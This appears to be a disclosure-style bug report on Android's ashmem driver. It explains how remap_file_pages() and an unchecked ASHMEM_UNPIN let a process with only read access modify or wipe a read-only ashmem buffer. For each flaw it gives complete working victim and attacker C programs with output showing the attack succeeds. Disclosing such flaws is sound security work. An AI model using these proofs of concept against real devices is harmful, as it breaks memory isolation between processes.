@@ -1,0 +1,250 @@
+This bug report describes two ways in which an attacker can modify the contents
+of a read-only ashmem fd. I'm not sure at this point what the most interesting
+user of ashmem is in the current Android release, but there are various users,
+including Chrome and a bunch of utility classes.
+In AOSP master, there is even code in
+<https://android.googlesource.com/platform/art/+/master/runtime/jit/jit_memory_region.cc>
+that uses ashmem for some JIT zygote mapping, which sounds extremely
+interesting.
+
+
+Android's ashmem kernel driver has an ->mmap() handler that attempts to lock
+down created VMAs based on a configured protection mask such that in particular
+write access to the underlying shmem file can never be gained. It tries to do
+this as follows (code taken from upstream Linux
+drivers/staging/android/ashmem.c):
+
+    static inline vm_flags_t calc_vm_may_flags(unsigned long prot)
+    {
+            return _calc_vm_trans(prot, PROT_READ,  VM_MAYREAD) |
+                   _calc_vm_trans(prot, PROT_WRITE, VM_MAYWRITE) |
+                   _calc_vm_trans(prot, PROT_EXEC,  VM_MAYEXEC);
+    }
+    [...]
+    static int ashmem_mmap(struct file *file, struct vm_area_struct *vma)
+    {
+            struct ashmem_area *asma = file->private_data;
+    [...]
+            /* requested protection bits must match our allowed protection mask */
+            if ((vma->vm_flags & ~calc_vm_prot_bits(asma->prot_mask, 0)) &
+                calc_vm_prot_bits(PROT_MASK, 0)) {
+                    ret = -EPERM;
+                    goto out;
+            }
+            vma->vm_flags &= ~calc_vm_may_flags(~asma->prot_mask);
+    [...]
+            if (vma->vm_file)
+                    fput(vma->vm_file);
+            vma->vm_file = asma->file;
+    [...]
+            return ret;
+    }
+
+This ensures that the protection flags specified by the caller don't conflict
+with the ->prot_mask, and it also clears the VM_MAY* flags as needed to prevent
+the user from afterwards adding new protection flags via mprotect().
+
+However, it improperly stores the backing shmem file, whose ->mmap() handler
+does not enforce the same restrictions, in ->vm_file. An attacker can abuse this
+through the remap_file_pages() syscall, which grabs the file pointer of an
+existing VMA and calls its ->mmap() handler to create a new VMA. In effect,
+calling remap_file_pages(addr, size, 0, 0, 0) on an ashmem mapping allows an
+attacker to raise the VM_MAYWRITE bit, allowing the attacker to gain write
+access to the ashmem allocation's backing file via mprotect().
+
+
+Reproducer (works both on Linux from upstream master in an X86 VM and on a
+Pixel 2 at security patch level 2019-09-05 via adb):
+
+====================================================================
+user@vm:~/ashmem_remap$ cat ashmem_remap_victim.c
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+
+#define __ASHMEMIOC   0x77
+#define ASHMEM_SET_SIZE   _IOW(__ASHMEMIOC, 3, size_t)
+#define ASHMEM_SET_PROT_MASK  _IOW(__ASHMEMIOC, 5, unsigned long)
+
+int main(void) {
+  int ashmem_fd = open("/dev/ashmem", O_RDWR);
+  if (ashmem_fd == -1)
+    err(1, "open ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x1000))
+    err(1, "ASHMEM_SET_SIZE");
+  char *mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ashmem_fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_SET_PROT_MASK, PROT_READ))
+    err(1, "ASHMEM_SET_SIZE");
+  mapping[0] = 'A';
+  printf("mapping[0] = '%c'\n", mapping[0]);
+
+  if (dup2(ashmem_fd, 42) != 42)
+    err(1, "dup2");
+  pid_t child = fork();
+  if (child == -1)
+    err(1, "fork");
+  if (child == 0) {
+    execl("./ashmem_remap_attacker", "ashmem_remap_attacker", NULL);
+    err(1, "execl");
+  }
+  int status;
+  if (wait(&status) != child) err(1, "wait");
+  printf("mapping[0] = '%c'\n", mapping[0]);
+}user@vm:~/ashmem_remap$ cat ashmem_remap_attacker.c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/mman.h>
+#include <err.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void) {
+  int ashmem_fd = 42;
+
+  /* sanity check */
+  char *write_mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ashmem_fd, 0);
+  if (write_mapping == MAP_FAILED) {
+    perror("mmap ashmem writable failed as expected");
+  } else {
+    errx(1, "trivial mmap ashmem writable worked???");
+  }
+
+  char *mapping = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, ashmem_fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap ashmem readonly failed");
+
+  if (mprotect(mapping, 0x1000, PROT_READ|PROT_WRITE) == 0)
+    errx(1, "mprotect ashmem writable worked???");
+
+  if (remap_file_pages(mapping, /*size=*/0x1000, /*prot=*/0, /*pgoff=*/0, /*flags=*/0))
+    err(1, "remap_file_pages");
+
+  if (mprotect(mapping, 0x1000, PROT_READ|PROT_WRITE))
+    err(1, "mprotect ashmem writable failed, attack didn't work");
+
+  mapping[0] = 'X';
+
+  puts("attacker exiting");
+}user@vm:~/ashmem_remap$ gcc -o ashmem_remap_victim ashmem_remap_victim.c
+user@vm:~/ashmem_remap$ gcc -o ashmem_remap_attacker ashmem_remap_attacker.c
+user@vm:~/ashmem_remap$ ./ashmem_remap_victim
+mapping[0] = 'A'
+mmap ashmem writable failed as expected: Operation not permitted
+attacker exiting
+mapping[0] = 'X'
+user@vm:~/ashmem_remap$ 
+====================================================================
+
+Interestingly, the (very much deprecated) syscall remap_file_pages() isn't even
+listed in bionic's SYSCALLS.txt, which would normally cause it to be blocked by
+Android's seccomp policy; however, SECCOMP_WHITELIST_APP.txt explicitly permits
+it for 32-bit ARM applications:
+
+    # b/36435222
+    int remap_file_pages(void *addr, size_t size, int prot, size_t pgoff, int flags)  arm,x86,mips
+
+
+
+
+ashmem supports purgable memory via ASHMEM_UNPIN/ASHMEM_PIN. Unfortunately,
+there is no access control for these - even if you only have read-only access to
+an ashmem file, you can still mark pages in it as purgable, causing them to
+effectively be zeroed out when the system is under memory pressure. Here's a
+simple test for that (to be run in an X86 Linux VM):
+
+====================================================================
+user@vm:~/ashmem_purging$ cat ashmem_purge_victim.c
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+
+#define __ASHMEMIOC   0x77
+#define ASHMEM_SET_SIZE   _IOW(__ASHMEMIOC, 3, size_t)
+#define ASHMEM_SET_PROT_MASK  _IOW(__ASHMEMIOC, 5, unsigned long)
+
+int main(void) {
+  int ashmem_fd = open("/dev/ashmem", O_RDWR);
+  if (ashmem_fd == -1)
+    err(1, "open ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x1000))
+    err(1, "ASHMEM_SET_SIZE");
+  char *mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ashmem_fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_SET_PROT_MASK, PROT_READ))
+    err(1, "ASHMEM_SET_SIZE");
+  mapping[0] = 'A';
+  printf("mapping[0] = '%c'\n", mapping[0]);
+
+  if (dup2(ashmem_fd, 42) != 42)
+    err(1, "dup2");
+  pid_t child = fork();
+  if (child == -1)
+    err(1, "fork");
+  if (child == 0) {
+    execl("./ashmem_purge_attacker", "ashmem_purge_attacker", NULL);
+    err(1, "execl");
+  }
+  int status;
+  if (wait(&status) != child) err(1, "wait");
+  printf("mapping[0] = '%c'\n", mapping[0]);
+}
+user@vm:~/ashmem_purging$ cat ashmem_purge_attacker.c
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+
+struct ashmem_pin {
+  unsigned int offset, len;
+};
+
+#define __ASHMEMIOC   0x77
+#define ASHMEM_SET_SIZE   _IOW(__ASHMEMIOC, 3, size_t)
+#define ASHMEM_UNPIN    _IOW(__ASHMEMIOC, 8, struct ashmem_pin)
+
+int main(void) {
+  struct ashmem_pin pin = { 0, 0 };
+  if (ioctl(42, ASHMEM_UNPIN, &pin))
+    err(1, "unpin 42");
+
+  /* ensure that shrinker doesn't get skipped */
+  int ashmem_fd = open("/dev/ashmem", O_RDWR);
+  if (ashmem_fd == -1)
+    err(1, "open ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x100000))
+    err(1, "ASHMEM_SET_SIZE");
+  char *mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ashmem_fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap ashmem");
+  if (ioctl(ashmem_fd, ASHMEM_UNPIN, &pin))
+    err(1, "unpin 42");
+
+  /* simulate OOM */
+  system("sudo sh -c 'echo 2 > /proc/sys/vm/drop_caches'");
+
+  puts("attacker exiting");
+}
+user@vm:~/ashmem_purging$ gcc -o ashmem_purge_victim ashmem_purge_victim.c
+user@vm:~/ashmem_purging$ gcc -o ashmem_purge_attacker ashmem_purge_attacker.c
+user@vm:~/ashmem_purging$ ./ashmem_purge_victim
+mapping[0] = 'A'
+attacker exiting
+mapping[0] = ''
+user@vm:~/ashmem_purging$ 
+====================================================================
